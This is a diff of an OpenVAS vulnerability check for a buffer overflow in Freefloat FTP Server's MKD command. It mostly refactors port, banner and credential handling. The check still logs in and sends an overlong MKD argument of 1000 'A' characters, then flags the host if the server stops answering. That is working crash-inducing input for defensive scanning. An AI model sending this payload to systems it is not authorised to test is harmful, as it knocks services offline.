@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_freefloat_ftp_mkd_cmd_bof_vuln.nasl 12014 2018-10-22 10:01:47Z mmartin $
+# $Id: gb_freefloat_ftp_mkd_cmd_bof_vuln.nasl 13347 2019-01-29 15:54:59Z cfischer $
 #
 # Freefloat FTP Server POST Auth 'MKD' Command Buffer Overflow Vulnerability
 #
@@ -27,8 +27,8 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802028");
-  script_version("$Revision: 12014 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-10-22 12:01:47 +0200 (Mon, 22 Oct 2018) $");
+  script_version("$Revision: 13347 $");
+  script_tag(name:"last_modification", value:"$Date: 2019-01-29 16:54:59 +0100 (Tue, 29 Jan 2019) $");
   script_tag(name:"creation_date", value:"2011-07-19 14:57:20 +0200 (Tue, 19 Jul 2011)");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
@@ -42,30 +42,35 @@ if(description)
   script_category(ACT_DENIAL);
   script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
   script_family("Buffer overflow");
-  script_dependencies("find_service.nasl");
+  script_dependencies("ftpserver_detect_type_nd_version.nasl");
   script_require_ports("Services/ftp", 21);
+  script_mandatory_keys("ftp_banner/available");
+
   script_tag(name:"impact", value:"Successful exploits may allow remote attackers to execute arbitrary
-code on the system or cause the application to crash.");
+  code on the system or cause the application to crash.");
+
   script_tag(name:"affected", value:"FreeFloat Ftp Server Version 1.00, Other versions may also be affected.");
+
   script_tag(name:"insight", value:"The flaw is due to improper bounds checking when processing
-'MKD' command with specially-crafted an overly long parameter.");
+  'MKD' command with specially-crafted an overly long parameter.");
+
   script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
   of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
   release, disable respective features, remove the product or replace the product by another one.");
+
   script_tag(name:"summary", value:"This host is running Freefloat FTP Server and is prone to buffer
-overflow vulnerability.");
+  overflow vulnerability.");
+
   script_tag(name:"solution_type", value:"WillNotFix");
+
   exit(0);
 }
 
 include("ftp_func.inc");
 
-ftpPort = get_kb_item("Services/ftp");
-if(!ftpPort){
-  ftpPort = 21;
-}
-
-if(!get_port_state(ftpPort)){
+ftpPort = get_ftp_port(default:21);
+banner = get_ftp_banner(port:ftpPort);
+if(!banner || "220 FreeFloat" >!< banner){
   exit(0);
 }
 
@@ -74,50 +79,41 @@ if(!soc) {
   exit(0);
 }
 
-## Accept the banner and
-banner =  recv(socket:soc, length:512);
-if("220 FreeFloat" >!< banner){
+banner = ftp_recv_line(socket:soc);
+ftp_close(socket:soc);
+if(!banner || "220 FreeFloat" >!< banner){
   exit(0);
 }
-ftp_close(socket:soc);
 
 soc1 = open_sock_tcp(ftpPort);
 if(!soc1) {
   exit(0);
 }
 
-user = get_kb_item("ftp/login");
-if(!user){
-  user = "test";
-}
-pass = get_kb_item("ftp/password");
-if(!pass){
-  pass = string("test");
-}
+kb_creds = ftp_get_kb_creds();
+user = kb_creds["login"];
+pass = kb_creds["pass"];
 
-##  Exist if not able to login
 ftplogin = ftp_log_in(socket:soc1, user:user, pass:pass);
 if(!ftplogin){
   exit(0);
 }
 
-## Send the crafted data
 send(socket:soc1, data:string("MKD ", crap(length: 1000, data:'A'),'\r\n'));
-
 ftp_close(socket:soc1);
 
 sleep (2);
 
 soc2 = open_sock_tcp(ftpPort);
 if(!soc2){
-  security_message(ftpPort);
+  security_message(port:ftpPort);
   exit(0);
 }
 
-## Some time server will be listening, but won't respond
-banner =  recv(socket:soc2, length:512);
-if("220 FreeFloat" >!< banner){
-  security_message(ftpPort);
+# nb: Some times the server is listening but won't respond
+banner = recv(socket:soc2, length:512);
+if(!banner || "220 FreeFloat" >!< banner){
+  security_message(port:ftpPort);
   exit(0);
 }
 ftp_close(socket:soc2);
